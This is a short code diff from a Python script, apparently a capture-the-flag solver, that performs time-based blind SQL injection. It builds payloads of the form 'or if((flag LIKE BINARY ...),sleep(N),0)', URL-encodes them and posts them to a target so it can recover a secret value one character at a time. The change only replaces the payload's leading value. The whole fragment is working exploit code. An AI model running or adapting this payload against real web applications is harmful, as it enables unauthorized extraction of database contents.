@@ -21,7 +21,7 @@ for i in range(0, max_length + 1):
         current_value = found_value + character
 
         # PAYLOAD
-        payload = "1000000 or if((flag LIKE BINARY '" + current_value + "%'),sleep(" + str(sleep) + "),0);"
+        payload = "1 or if((flag LIKE BINARY '" + current_value + "%'),sleep(" + str(sleep) + "),0);"
         encoded_payload = "texto=" + urllib.parse.quote(payload)
 
         response = requests.post(url, data=encoded_payload, timeout=timeout, headers=headers)
